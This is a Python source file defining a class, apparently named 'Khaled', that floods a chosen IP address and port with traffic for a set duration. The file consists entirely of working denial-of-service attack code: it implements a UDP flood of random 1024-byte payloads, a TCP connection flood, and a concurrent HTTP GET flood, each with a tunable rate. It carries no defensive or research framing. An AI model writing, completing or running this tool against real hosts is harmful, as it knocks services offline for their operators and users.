import asyncio
import random
import socket
import aiohttp
import logging
from datetime import datetime
from ipaddress import ip_address, IPv4Address, IPv6Address

logger = logging.getLogger(__name__)

class InvalidTargetException(Exception):
    pass

class Khaled:
    def __init__(self, target: str, port: int, duration: int, method: str = "UDP", pps: int = 100):
        self.target = target
        self.port = port
        self.duration = duration
        self.method = method.upper()
        self.pps = pps
        self._running = False
        self._validate_params()

    def _validate_params(self):
        # التحقق من صحة العنوان والمنفذ
        try:
            ip_address(self.target)
        except ValueError:
            # يمكن اضافة دعم DNS لكن هنا نتحقق فقط من IP
            raise InvalidTargetException(f"Invalid IP address: {self.target}")

        if not (1 <= self.port <= 65535):
            raise ValueError(f"Port must be between 1 and 65535, got {self.port}")

        if self.method not in ("UDP", "TCP", "HTTP"):
            raise ValueError(f"Method must be UDP, TCP or HTTP, got {self.method}")

        if self.duration <= 0 or self.pps <= 0:
            raise ValueError("Duration and PPS must be positive integers")

    async def attack(self):
        self._running = True
        logger.info(f"Starting {self.method} attack on {self.target}:{self.port} for {self.duration}s with {self.pps} PPS")
        end_time = asyncio.get_event_loop().time() + self.duration

        if self.method == "UDP":
            await self._udp_flood(end_time)
        elif self.method == "TCP":
            await self._tcp_flood(end_time)
        else:
            await self._http_flood(end_time)

    async def _udp_flood(self, end_time):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)

        while self._running and asyncio.get_event_loop().time() < end_time:
            for _ in range(self.pps):
                try:
                    sock.sendto(payload, (self.target, self.port))
                except Exception as e:
                    logger.debug(f"UDP send error: {e}")
            await asyncio.sleep(1)

        sock.close()

    async def _tcp_flood(self, end_time):
        async def send_packet():
            try:
                reader, writer = await asyncio.open_connection(self.target, self.port)
                writer.write(random._urandom(1024))
                await writer.drain()
                writer.close()
                await writer.wait_closed()
            except Exception as e:
                logger.debug(f"TCP send error: {e}")

        while self._running and asyncio.get_event_loop().time() < end_time:
            tasks = [asyncio.create_task(send_packet()) for _ in range(self.pps)]
            await asyncio.gather(*tasks)
            await asyncio.sleep(1)

    async def _http_flood(self, end_time):
        async def send_request(session):
            try:
                url = f"http://{self.target}:{self.port}/"
                async with session.get(url) as resp:
                    await resp.text()
            except Exception as e:
                logger.debug(f"HTTP request error: {e}")

        async with aiohttp.ClientSession() as session:
            while self._running and asyncio.get_event_loop().time() < end_time:
                tasks = [asyncio.create_task(send_request(session)) for _ in range(self.pps)]
                await asyncio.gather(*tasks)
                await asyncio.sleep(1)

    def stop(self):
        self._running = False
